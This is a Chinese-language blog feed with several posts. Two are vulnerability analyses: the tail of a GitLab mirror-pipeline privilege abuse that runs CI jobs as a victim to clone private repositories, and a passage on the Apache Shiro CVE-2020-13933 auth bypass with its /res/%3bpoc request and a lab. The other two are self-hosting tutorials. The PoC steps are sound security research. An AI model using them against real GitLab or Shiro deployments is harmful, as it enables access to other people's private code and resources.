id="0x44-创建攻击者的-poc-镜像仓库"><a href="#0x44-创建攻击者的-poc-镜像仓库" class="headerlink" title="0x44 创建攻击者的 poc 镜像仓库"></a>0x44 创建攻击者的 poc 镜像仓库</h3><ul><li>使用 <code>attacker2</code> 账号登录 Gitlab</li><li>新建分组 <code>New Group</code>：<ul><li>Name： <code>test</code></li><li>Visibility Level： <code>Public</code></li></ul></li><li>在 <code>test</code> 分组内新建<strong>完全为空</strong>的仓库 <code>New Project</code>：<ul><li>Name： <code>poc</code></li><li>Visibility Level： <code>Public</code></li></ul></li></ul><p><img src="07.png"></p><p>配置镜像仓库 <code>Settings =&gt; Repository =&gt; Pull from a remote repository</code>：</p><ul><li><code>Mirror repository</code>： 勾选</li><li><code>Git repository URL</code>： 填写 <code>http://GITLAB/attacker1/poc</code></li><li><code>Password</code>： （留空，Pull 的仓库密级为 Public，不需要密码）</li><li><code>Trigger pipelines for mirror updates</code>： 勾选（镜像同步时触发 CI 脚本执行）</li></ul><p>配置成功后，会每 30 分钟检查一次源仓库是否发生变化，若有变化则强制同步。</p><blockquote><p><code>Git repository URL</code> 指向的就是前面创建的 poc 仓库，之所以不使用 127.0.0.1 是因为 Pull 禁止拉取本地仓库，但是可以利用 DNS 绕过： <code>GITLAB</code> 是 <a href="docker-compose.yml"><code>docker-compose.yml</code></a> 为 Gitlab 容器分配的 hostname，默认会设置到 <code>/etc/hosts</code> 中，虽然宿主机无法解析 <code>GITLAB</code>，但容器内相当于访问了 <code>http://127.0.0.1/attacker1/poc</code></p></blockquote><p><img src="08.png"></p><h3 id="0x45-强制转移-poc-镜像仓库的属主给受害者"><a href="#0x45-强制转移-poc-镜像仓库的属主给受害者" class="headerlink" title="0x45 强制转移 poc 镜像仓库的属主给受害者"></a>0x45 强制转移 poc 镜像仓库的属主给受害者</h3><ul><li>继续使用 <code>attacker2</code> 账号</li><li>打开 <a href="http://127.0.0.1/groups/test/-/group_members">http://127.0.0.1/groups/test/-/group_members</a> 页面管理 <code>test</code> 分组的用户</li><li>添加 <code>victim</code> 用户进分组：<ul><li><code>Add new member to test</code>： <code>victim</code></li><li><code>Permissions</code>： <code>Owner</code></li><li><code>Expiration date</code>： （留空，即无限期）</li></ul></li><li>点击右上角账号头像 <code>=&gt; Setting =&gt; Account =&gt; Delete account</code> 删除当前账号（<code>attacker2</code>）</li></ul><p>【目的】 <code>test</code> 分组内只有 <code>victim</code> 和 <code>attacker2</code> 两个 <code>Owner</code>，当 <code>attacker2</code> 用户被删除之后，<code>test</code> 分组及其下所有仓库的所有权会强制转移到 <code>victim</code> 名下。而当前 <code>test</code> 分组下有一个从 <code>attacker1/poc</code> 镜像同步的 <code>test/poc</code> 仓库，即相当于把 <code>test/poc</code> 仓库强制过继给 <code>victim</code> 用户。</p><p><img src="09.png"></p><p><img src="10.png"></p><hr><h2 id="0x50-漏洞利用"><a href="#0x50-漏洞利用" class="headerlink" title="0x50 漏洞利用"></a>0x50 漏洞利用</h2><p>先捋一下到目前为止的现状：</p><ul><li>攻击者强制且偷偷地为受害者 <code>victim</code> 创建了一个 <code>test/poc</code> 仓库</li><li><code>test/poc</code> 仓库的内容是从 <code>attacker1/poc</code> 仓库镜像同步的（每 30 分钟检查一次是否发生变化需要同步）</li><li><code>attacker1/poc</code> 仓库的内容是由攻击者控制的，包括 CI 脚本 <code>.gitlab-ci.yml</code></li><li>因 <code>test/poc</code> 仓库设置了 <code>Trigger pipelines for mirror updates</code>，故每次同步时会执行 CI 脚本</li><li>因 <code>test/poc</code> 仓库的 <code>Owner</code> 是 <code>victim</code>，故执行 CI 脚本时会使用 <code>victim</code> 的权限</li></ul><p><img src="13.png"></p><p>再回顾前面所设置的 CI 脚本 <code>.gitlab-ci.yml</code> 内容，此 PoC 仅仅是在 Runner 中使用 <code>victim</code> 的权限访问了其 Private 仓库 <code>target</code> 的目录结构和 <code>README.md</code>：</p><pre><code>image: "ruby:2.6"rspec:    script:      - git clone http://gitlab-ci-token:$CI_JOB_TOKEN@172.168.30.2/victim/target.git    - cd target    - ls -lah .      - cat README.md</code></pre><p>尔后若要真正发起攻击，攻击者只需要任意修改 <code>attacker1/poc</code> 仓库中一些无关紧要的内容，然后等 30 分钟（最坏情况下），就可以使用 <code>victim</code> 的权限执行既定的 CI 脚本。</p><p>虽然攻击者没有直接权限访问 Pipeline Jobs 的执行结果，但是只需要调整 CI 脚本的输出目标，例如把仓库的内容发送到指定 Email 或 FTP 服务器，即可窃取仓库代码。</p><p><img src="11.png"></p><hr><h2 id="0x60-漏洞修复"><a href="#0x60-漏洞修复" class="headerlink" title="0x60 漏洞修复"></a>0x60 漏洞修复</h2><table><thead><tr><th align="center">漏洞成因</th><th align="left">原因描述</th><th align="left">修复方法</th></tr></thead><tbody><tr><td align="center">直接原因</td><td align="left">某个用户在邀请其他用户加入 Groups 时，被邀请的用户不需要任何确认。在上述分析过程中，受害者就是这样在不知情的状况下被强制拉到了一个恶意 Groups 中。</td><td align="left">某个用户在邀请其他用户加入 Groups 时，需要得到被邀请的用户的确认。</td></tr><tr><td align="center">根本原因</td><td align="left">如果某个 Groups 存在一个启用了 <code>Trigger pipelines for mirror updates</code> 的 Mirror 仓库，并且该 Groups 的 Owner 删除了其账号，则 pipeline 不应该使用该 Groups 中的其他 Owner 进行触发。</td><td align="left">当 Groups 的 Owner 删除了其账号，该 Groups 下的仓库会关闭 Mirror 功能，且触发 pipeline 的用户会变成 <code>nil</code> 而不是 Groups 中的其他 Owner</td></tr></tbody></table><p>以下是官方的修复代码片段：</p><p><img src="12.png"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何使用浏览器进行远程开发</title>
      <link href="/tools/ru-he-shi-yong-liu-lan-qi-jin-xing-yuan-cheng-kai-fa/"/>
      <url>/tools/ru-he-shi-yong-liu-lan-qi-jin-xing-yuan-cheng-kai-fa/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>现在比较主流的远程开发方式，是把代码放在远程服务器，然后在本地的 <a href="https://code.visualstudio.com/">vscode</a> 通过 SSH 登录到该服务器进行开发。</p><p>但是对于无法安装 <a href="https://code.visualstudio.com/">vscode</a> 的设备（如 iPad）则无法这样做。</p><p>为了解决这个问题，可以把 <a href="https://github.com/cdr/code-server">vscode</a> 也安装到远程服务器，并提供可以访问该 <a href="https://github.com/cdr/code-server">vscode</a> 的 web 服务接口，那么在任意设备均可以通过浏览器实现远程开发了。</p><p><a href="https://github.com/cdr/code-server">code-server</a> 就是可以安装在远程服务器并提供 web 服务的 vscode。</p><p><img src="00.png"></p><blockquote><p>参考文档《<a href="https://sspai.com/post/60456">为 iPad 部署基于 VS Code 的远程开发环境</a>》</p></blockquote><h2 id="镜像仓库"><a href="#镜像仓库" class="headerlink" title="镜像仓库"></a>镜像仓库</h2><p>为方便起见，这里已经把相关镜像组件都封装到 Github 仓库 <a href="https://github.com/lyy289065406/vscode-web-docker">vscode-web-docker</a>。</p><h2 id="项目构建"><a href="#项目构建" class="headerlink" title="项目构建"></a>项目构建</h2><ul><li>宿主机安装 docker、docker-compose</li><li>宿主机安全组/防火墙（iptables/firewall）放行 8443 端口的入口流量</li><li>下载仓库： <code>git clone https://github.com/lyy289065406/vscode-web-docker</code></li><li>构建镜像并运行： <code>./run.sh -p "basicauth_password" -w "/path/to/mnt/workspace"</code></li></ul><blockquote><p><code>-p</code> 指定通过浏览器访问 vscode 的 BasicAuth 密码； <code>-w</code> 指定挂载到容器的工作目录，该目录下的项目可直接被 vscode 访问（默认路径为 <a href="vscode/workspace/"><code>./vscode/workspace/</code></a>）</p></blockquote><h2 id="远程访问"><a href="#远程访问" class="headerlink" title="远程访问"></a>远程访问</h2><p>用浏览器访问 http://${server-ip}:8443 即可（访问的是容器内的内容）</p><p>但直接用 iPad 的 Safari 浏览器访问 <a href="https://github.com/cdr/code-server">code-server</a> 的体验还是比较糟糕，上面地址栏和下面外接键盘出现的菜单栏都非常不顺畅，因此最好使用 <a href="https://sspai.com/app/VSApp%20-%20code-server">VSApp</a> 作为 ipad 的本地客户端去访问 <a href="https://github.com/cdr/code-server">code-server</a>。</p><p><a href="https://sspai.com/app/VSApp%20-%20code-server">VSApp</a> 是一款专门为 iPad 用来优化 <a href="https://github.com/cdr/code-server">code-server</a> 连接的 iOS 原生应用： 启动 APP 后，在【Self Hosted Server】填写 <a href="https://github.com/cdr/code-server">code-server</a> 的连接信息即可。</p><blockquote><p>VSApp 已更名为 Sevediter for code-server</p></blockquote><p><img src="01.jpg"></p><p><img src="02.jpg"></p><h2 id="FAQ"><a href="#FAQ" class="headerlink" title="FAQ"></a>FAQ</h2><h3 id="Q1-在-terminal-无法复制黏贴"><a href="#Q1-在-terminal-无法复制黏贴" class="headerlink" title="Q1. 在 terminal 无法复制黏贴"></a>Q1. 在 terminal 无法复制黏贴</h3><p>web 版编辑器的快捷键没变，但是终端快捷键改了：</p><ul><li>复制： <code>ctrl + c</code></li><li>粘贴： <code>shift + insert</code></li></ul><h3 id="Q2-无法安装-Remote-SSH-插件做远程开发"><a href="#Q2-无法安装-Remote-SSH-插件做远程开发" class="headerlink" title="Q2. 无法安装 Remote - SSH 插件做远程开发"></a>Q2. 无法安装 Remote - SSH 插件做远程开发</h3><p>web 版确实不支持这个插件。</p><p>但是 vscode-web 已经在你的远程代码服务器了，还要远程去哪里。。。</p><p>只需要把远程服务器的代码目录挂载到 vscode-web 的 workspace ，vscode-web 就像访问本地代码一样。</p><h3 id="Q3-为什么-iPad-无法渲染-vscode-web-内容"><a href="#Q3-为什么-iPad-无法渲染-vscode-web-内容" class="headerlink" title="Q3. 为什么 iPad 无法渲染 vscode-web 内容"></a>Q3. 为什么 iPad 无法渲染 vscode-web 内容</h3><p>iOS 系统版本过低导致，至少需要 iOS 13 版本，该版本之后对浏览器做了优化，可以渲染 PC 浏览器的内容。</p><p>但是最好还是使用 VSApp 访问 vscode-web ，速度不是浏览器可以比拟的。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 开发/工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vscode </tag>
            
            <tag> vsapp </tag>
            
            <tag> 远程开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用 calibre 搭建私人书库</title>
      <link href="/website/calibre-da-jian-si-ren-shu-ku/"/>
      <url>/website/calibre-da-jian-si-ren-shu-ku/</url>
      
        <content type="html"><![CDATA[<h2 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h2><p>你是否面临以下困扰：</p><ul><li>想翻看曾经看过的某本小说的时候，网上已经找不到了</li><li>即使网上找到了，因为版权原因无法在线看、甚至无法下载</li><li>可以在线看，但是要收费</li><li>连载小说几个月才出一册，囤了一年后却不知道自己看到哪了</li><li>在家看小说看了一半突然要出门，打算在路上看，于是不得不把小说发送到手机</li><li>……</li></ul><p>其实只需要搭建一个私人书库，这些问题就迎刃而解了：</p><ul><li>Calibre： 一款强大且易用的电子书本地管理工具，可以在 Windows、macOS 和 Linux 平台搭建个人私人的电子书书库。</li><li>Calibre-web： Calibre 的 CMS 界面，用于读取和下载 Calibre 数据库中的电子书，同时它支持 OPDS 协议</li><li><a href="https://en.wikipedia.org/wiki/OPDS">OPDS</a>： 全称是 Open Publication Distribution System 开放式出版发布系统，是基于 Atom 和 Http 的一种目录格式。OPDS 主要实现 2 个功能：(1) 让电子出版物被发现，可以使用简单的搜索和一些其他的浏览器技术；(2) 让用户下载电子出版物，直接免费下载或进行出售</li></ul><p><img src="00.png"></p><h2 id="镜像仓库"><a href="#镜像仓库" class="headerlink" title="镜像仓库"></a>镜像仓库</h2><p>为方便起见，这里已经把相关镜像组件都封装到 Github 仓库 <a href="https://github.com/lyy289065406/calibre-docker">calibre-docker</a>：</p><table><thead><tr><th align="center">镜像</th><th align="center">用途</th><th align="center">服务端口</th><th align="left">端口说明</th></tr></thead><tbody><tr><td align="center"><a href="https://github.com/kovidgoyal/calibre">calibre</a></td><td align="center">calibre 后端</td><td align="center">8080</td><td align="left">calibre 管理页面</td></tr><tr><td align="center"><a href="https://github.com/janeczku/calibre-web">calibre-web</a></td><td align="center">calibre 前端</td><td align="center">8083</td><td align="left">CMS 页面，同时提供 OPDS 服务</td></tr><tr><td align="center"><a href="https://www.nginx.com/">nginx</a></td><td align="center">反向代理 calibre 服务</td><td align="center">80</td><td align="left">项目说明页面</td></tr></tbody></table><h2 id="部署步骤"><a href="#部署步骤" class="headerlink" title="部署步骤"></a>部署步骤</h2><h3 id="1-项目构建"><a href="#1-项目构建" class="headerlink" title="1. 项目构建"></a>1. 项目构建</h3><ul><li>宿主机安装 docker、docker-compose</li><li>宿主机安全组/防火墙（iptables/firewall）放行这些端口的入口流量： 80、8080、8081、8083</li><li>下载仓库： <code>git clone -b main --single-branch https://github.com/lyy289065406/calibre-docker /usr/local/calibre-docker</code> （只下载 main 主分支即可）</li><li>打开仓库目录： <code>cd /usr/local/calibre-docker</code></li><li>构建镜像并运行： <code>./run.sh -u admin -p admin123</code> （<strong>完全启动约需要 2 分钟，书库越大启动越慢</strong>）</li></ul><blockquote><p>构建时设置的是 calibre 后端管理页面的账密，calibre-web 前端账密只能在 CMS 上修改。</p></blockquote><h3 id="2-配置-calibre"><a href="#2-配置-calibre" class="headerlink" title="2. 配置 calibre"></a>2. 配置 calibre</h3><ul><li>登录后端管理页面：<code>http://${server-ip}/mgr/</code>（或 <code>http://${server-ip}:8080</code>）</li><li>默认登录账密: <code>admin / admin123</code></li><li>参考下图，根据向导进行初始化设置（必须记得配置路径为 <code>/config/Calibre Library</code>，该路径用于存储 calibre 的配置库，默认挂载到宿主机的 <code>data</code> 目录）</li></ul><p><img src="01.png"></p><p><img src="02.png"></p><h3 id="3-导入本地电子书"><a href="#3-导入本地电子书" class="headerlink" title="3. 导入本地电子书"></a>3. 导入本地电子书</h3><p>先把电子书上传到宿主机的 <code>books</code> 目录，然后登录后台管理页面，点击【Add books】，在【/books】目录找到所上传的电子书，点击【Open】即可导入到 calibre 数据库。</p><blockquote><p>可以把个人电子书存储到另一个 Repo（如 <a href="https://github.com/lyy289065406/ebooks-library">ebooks-library</a>），使用时再通过 git clone 拉取到 <code>books</code> 目录</p></blockquote><p><img src="03.png"></p><h3 id="4-配置-calibre-web"><a href="#4-配置-calibre-web" class="headerlink" title="4. 配置 calibre-web"></a>4. 配置 calibre-web</h3><ul><li>登录前端 CMS 页面：<code>http://${server-ip}/cms/</code>（或 <code>http://${server-ip}:8083</code>）</li><li>默认登录账密: <code>admin / admin123</code></li><li>根据向导设置 calibre 配置库路径，路径就是前面的 <code>/config/Calibre Library</code></li><li>成功登录后即可看到在后端管理页面导入的电子书</li></ul><blockquote><p>点击右上角的 【admin】 即可修改用户密码</p></blockquote><p><img src="04.png"></p><p><img src="05.png"></p><h2 id="阅读设置"><a href="#阅读设置" class="headerlink" title="阅读设置"></a>阅读设置</h2><h3 id="1-PC-阅读"><a href="#1-PC-阅读" class="headerlink" title="1. PC 阅读"></a>1. PC 阅读</h3><p>默认情况下 admin 用户是无法在线阅读电子书的，需要先授权阅读权限：</p><p>点击右上角的【管理权限】，编辑【admin】用户，勾选【允许在线阅读】即可。</p><p>之后点击任意一本电子书，会多出一个【在线阅读】按钮：</p><p><img src="07.png"></p><p><img src="08.png"></p><h3 id="2-手机阅读"><a href="#2-手机阅读" class="headerlink" title="2. 手机阅读"></a>2. 手机阅读</h3><p>calibre-web 提供了 OPDS 协议的服务地址：<code>http://${server-ip}/cms/opds/</code>（或 <code>http://${server-ip}:8083/opds/</code>）。</p><p>换言之所有支持 OPDS 协议的 APP 都可以对接到 calibre-web 获取书库中的电子书，例如这些 APP ：</p><table><thead><tr><th align="center">APP</th><th align="center">适用设备/系统</th><th align="left">说明</th></tr></thead><tbody><tr><td align="center"><a href="https://play.google.com/store/apps/details?id=com.fullreader&amp;hl=zh_CN">FullReader</a></td><td align="center">Android</td><td align="left">界面清新但是有广告，而且汉化不完全，有少量韩文</td></tr><tr><td align="center"><a href="https://play.google.com/store/apps/details?id=com.neverland.alreader&amp;hl=en&amp;gl=US">AIReader</a></td><td align="center">Android</td><td align="left">没有广告但是外观不好看</td></tr><tr><td align="center">kybook3</td><td align="center">iOS</td><td align="left">目前已知 iOS 唯一支持 OPDS 的 APP</td></tr><tr><td align="center">kindle</td><td align="center">kindle</td><td align="left">仅在 kindle 设备上支持 OPDS，在 Android/iOS 上不支持</td></tr></tbody></table><p>以 <a href="https://play.google.com/store/apps/details?id=com.fullreader&amp;hl=zh_CN">FullReader</a> 为例：点击【网络图书馆】-&gt;【添加OPDS目录】，填写 calibre 的 OPDS 服务地址和 BasicAuth 账号密码即可。</p><p><img src="06.png"></p><h3 id="3-iPad-阅读"><a href="#3-iPad-阅读" class="headerlink" title="3. iPad 阅读"></a>3. iPad 阅读</h3><p>在 iPad 目前已知的只有 kybook3 这款 APP 支持 OPDS 协议：</p><p>点击【目录】-&gt;【添加】，填写 calibre 的 OPDS 服务地址和 BasicAuth 账号密码即可。</p><p><img src="09.jpg"></p><p><img src="10.jpg"></p><p><img src="11.jpg"></p><p><img src="12.jpg"></p><p><img src="13.jpg"></p><h2 id="FAQ"><a href="#FAQ" class="headerlink" title="FAQ"></a>FAQ</h2><h3 id="Q1-迁移-data-目录的数据库后无法运行-CMS-服务"><a href="#Q1-迁移-data-目录的数据库后无法运行-CMS-服务" class="headerlink" title="Q1. 迁移 data 目录的数据库后无法运行 CMS 服务"></a>Q1. 迁移 data 目录的数据库后无法运行 CMS 服务</h3><p>理论上 data 目录挂载了 calibre 运行所需的全部数据（包括电子书本身），只要完整迁移到任何设备就可以直接运行。</p><p>但若 calibre 非正常停止过，就会导致 calibre-web （即 CMS 服务）无法运行。</p><p>解决方法也很简单：</p><ul><li>执行 <code>stop.sh</code> 脚本停止 calibre 服务</li><li>查看 <code>data/.config/calibre/gui.json</code> 的 <code>library_usage_stats</code> 状态值是否为 <code>1</code>，若不是则修改为 <code>1</code></li><li>执行 <code>run.sh</code> 脚本重新启动 calibre 服务，此时 CMS 服务应该可以正常启动了</li></ul><h3 id="Q2-项目仓库太大无法下载到本地"><a href="#Q2-项目仓库太大无法下载到本地" class="headerlink" title="Q2. 项目仓库太大无法下载到本地"></a>Q2. 项目仓库太大无法下载到本地</h3><p>所提供的项目仓库包含 main 和 produce 两个分支，其中：</p><ul><li>main： 干净分支，纯粹用于构建私人书库</li><li>produce： 我的生产环境分支，归档了我的个人书库数据，而且会越来越大</li></ul><p>因此 produce 分支是不需要下载的，只下载 main 主分支即可：</p><p><code>git clone -b main --single-branch https://github.com/lyy289065406/calibre-docker</code></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 网站建设 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> calibre </tag>
            
            <tag> 书库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-13933 漏洞分析</title>
      <link href="/safe/cve-2020-13933-lou-dong-fen-xi/"/>
      <url>/safe/cve-2020-13933-lou-dong-fen-xi/</url>
      
        <content type="html"><![CDATA[<h2 id="0x10-漏洞背景"><a href="#0x10-漏洞背景" class="headerlink" title="0x10 漏洞背景"></a>0x10 漏洞背景</h2><p>Apache Shiro 是一个强大且易用的 Java 安全框架，执行身份验证、授权、密码和会话管理，通常会和 Spring 等框架一起搭配使用来开发 web 应用（请求在到达 Spring 之前，会先经过 Shiro 认证身份）。</p><p>因为某个特定测试场景，Shiro 被白帽子发现了 CVE-2020-11989 身份校验绕过漏洞，漏洞原因在于 Shiro 处理 url 的逻辑与 spring 存在差异。</p><p>对此官方发布了 1.5.3 版本进行修复，但是因为修复补丁存在缺陷， 再次导致了 CVE-2020-13933 身份校验绕过漏洞，官方不得不再次发布了 1.6.0 修复版本。</p><h2 id="0x20-漏洞靶场"><a href="#0x20-漏洞靶场" class="headerlink" title="0x20 漏洞靶场"></a>0x20 漏洞靶场</h2><h3 id="0x21-靶场搭建"><a href="#0x21-靶场搭建" class="headerlink" title="0x21 靶场搭建"></a>0x21 靶场搭建</h3><p>环境要求：</p><ul><li>JDK: <code>1.8</code></li><li>spring-boot: <code>2.3.3</code></li><li>apache-shiro: <code>1.5.3 (&lt; 1.6.0)</code></li></ul><p>靶场源码（Maven）： <a href="https://github.com/lyy289065406/CVE-2020-13933">https://github.com/lyy289065406/CVE-2020-13933</a></p><p>靶场关键代码说明：</p><ul><li><a href="https://github.com/lyy289065406/CVE-2020-13933/blob/master/src/main/java/com/exp/cve/ShiroConfig.java"><code>ShiroConfig.java</code></a>： 权限配置， 当请求 <code>/res/*</code> 资源时， 302 跳转到登陆页面进行身份认证</li><li><a href="https://github.com/lyy289065406/CVE-2020-13933/blob/master/src/main/java/com/exp/cve/NameController.java"><code>NameController.java</code></a>：<br>　　□ <code>/res/{name}</code>： 请求名为 <code>name</code> 的的资源（触发身份认证）<br>　　□ <code>/res/</code>： 不请求任何资源（不触发身份认证）</li></ul><blockquote><p>此靶场已收录到 <a href="https://vulmon.com/vulnerabilitydetails?qid=CVE-2020-13933">Vulmon 漏洞情报搜索引擎</a></p></blockquote><h3 id="0x22-靶场验证"><a href="#0x22-靶场验证" class="headerlink" title="0x22 靶场验证"></a>0x22 靶场验证</h3><p>不在请求路由中指定资源名称时，不触发身份验证，也无资源返回： <a href="http://127.0.0.1:8080/res/"><code>http://127.0.0.1:8080/res/</code></a></p><p><img src="./01.png"></p><p>在请求路由中指定资源名称时，302 跳转到身份验证页面： <a href="http://127.0.0.1:8080/res/poc"><code>http://127.0.0.1:8080/res/poc</code></a></p><p><img src="./02.png"></p><p>构造特定 PoC 请求指定资源时，不触发身份验证，并返回资源： <a href="http://127.0.0.1:8080/res/%3bpoc">http://127.0.0.1:8080/res/%3bpoc</a> （<code>%3b</code> 是 <code>;</code> 的 URL 编码）</p><p><img src="./03.png"></p><h2 id="0x30-漏洞分析"><a href="#0x30-漏洞分析" class="headerlink" title="0x30 漏洞分析"></a>0x30 漏洞分析</h2><h3 id="0x31-前置漏洞回顾"><a href="#0x31-前置漏洞回顾" class="headerlink" title="0x31 前置漏洞回顾"></a>0x31 前置漏洞回顾</h3><p>通过漏洞背景可知， CVE-2020-13933 是 CVE-2020-11989 的修复补丁不当产生的，因此有必要了解 CVE-2020-11989 的漏洞原因、以及官方补丁的改动位置。</p><p>通过查阅 CVE-2020-11989 现有的<a href="https://xz.aliyun.com/t/7964">漏洞分析报告</a>， 可知 Shiro 为了处理请求路由中形如 <code>;jsessionid=C7E5ED51DCE6B918FD88AE5575C589B6</code> 的参数，会截断 <code>;</code> 后的内容。</p><p>对于 Shiro <code>&lt; 1.5.3</code> 的版本，因为相关逻辑缺陷，若刻意构造路由类似 <code>/;/site/res/name</code> 的请求，会因为匹配错误导致请求路由截断成 <code>/</code>，此时因为没有指定要请求的资源路由，故不会触发 Shiro 的身份认证逻辑。</p><p>因为不需要认证身份，请求 <code>/;/site/res/name</code> 被直接送到 Spring 获取资源，经过 Spring 格式化后（截取根目录后的资源路径），请求路由截断成 <code>/res/name</code>，最终可以成功获取到资源页面，导致 Shiro 权限绕过。</p><p>为了修复这个漏洞， Shiro 发布了 1.5.3 版本，可以对比下官方修复的代码位置：</p><p>【修改前】 <a href="https://github.com/apache/shiro/blob/shiro-root-1.5.2-release-vote1/web/src/main/java/org/apache/shiro/web/util/WebUtils.java"><code>Shiro 1.5.2</code></a>:</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> String <span class="token function">getPathWithinApplication</span><span class="token punctuation">(</span>HttpServletRequest request<span class="token punctuation">)</span> <span class="token punctuation">{</span>    String contextPath <span class="token operator">=</span> <span class="token function">getContextPath</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span>    String requestUri <span class="token operator">=</span> <span class="token function">getRequestUri</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>StringUtils<span class="token punctuation">.</span><span class="token function">startsWithIgnoreCase</span><span class="token punctuation">(</span>requestUri<span class="token punctuation">,</span> contextPath<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// Normal case: URI contains context path.</span>        String path <span class="token operator">=</span> requestUri<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>contextPath<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>StringUtils<span class="token punctuation">.</span><span class="token function">hasText</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span> <span class="token operator">?</span> path <span class="token operator">:</span> <span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// Special case: rather unusual.</span>        <span class="token keyword">return</span> requestUri<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>【修改后】 <a href="https://github.com/apache/shiro/blob/shiro-root-1.5.3-release-vote1/web/src/main/java/org/apache/shiro/web/util/WebUtils.java"><code>Shiro 1.5.3</code></a>:</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> String <span class="token function">getPathWithinApplication</span><span class="token punctuation">(</span>HttpServletRequest request<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">normalize</span><span class="token punctuation">(</span><span class="token function">removeSemicolon</span><span class="token punctuation">(</span><span class="token function">getServletPath</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">getPathInfo</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="0x32-当前漏洞分析"><a href="#0x32-当前漏洞分析" class="headerlink" title="0x32 当前漏洞分析"></a>0x32 当前漏洞分析</h3><p>由于官方更新 <a href="https://github.com/apache/shiro/blob/shiro-root-1.5.3-release-vote1/web/src/main/java/org/apache/shiro/web/util/WebUtils.java"><code>Shiro 1.5.3</code></a> 版本后，身份绕过漏洞依旧存在，说明这次代码修复的逻辑仍有不完善的地方。</p><p>为了分析漏洞成因，可以先搭建上述的靶场，然后在 <a href="https://github.com/apache/shiro/blob/shiro-root-1.5.3-release-vote1/web/src/main/java/org/apache/shiro/web/util/WebUtils.java"><code>Shiro 1.5.3</code></a> 的官方修复代码打断点 DEBUG。</p><p>不难发现，修复代码位置在 Shiro 处理请求路由的入口处 <a href="https://github.com/apache/shiro/blob/shiro-root-1.5.3-release-vote1/web/src/main/java/org/apache/shiro/web/util/WebUtils.java"><code>WebUtils.java</code></a>。为了便于分析，这里对代码做了逐行拆解：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">// 输入请求路由： http://127.0.0.1:8080/res/%3bpoc</span><span class="token keyword">public</span> <span class="token keyword">static</span> String <span class="token function">getPathWithinApplication</span><span class="token punctuation">(</span>HttpServletRequest request<span class="token punctuation">)</span> <span class="token punctuation">{</span>    String servletPath <span class="token operator">=</span> <span class="token function">getServletPath</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">// servletPath = "/res/;poc" （URL 已解码）</span>    String pathInfo <span class="token operator">=</span> <span class="token function">getPathInfo</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">// pathInfo = ""</span>    String path <span class="token operator">=</span> servletPath <span class="token operator">+</span> pathInfo<span class="token punctuation">;</span>           <span class="token comment" spellcheck="true">// path = "/res/;poc"</span>    path <span class="token operator">=</span> <span class="token function">removeSemicolon</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token comment" spellcheck="true">// path = "/res/"  （截断 ; 后面的内容）</span>    path <span class="token operator">=</span> <span class="token function">normalize</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span 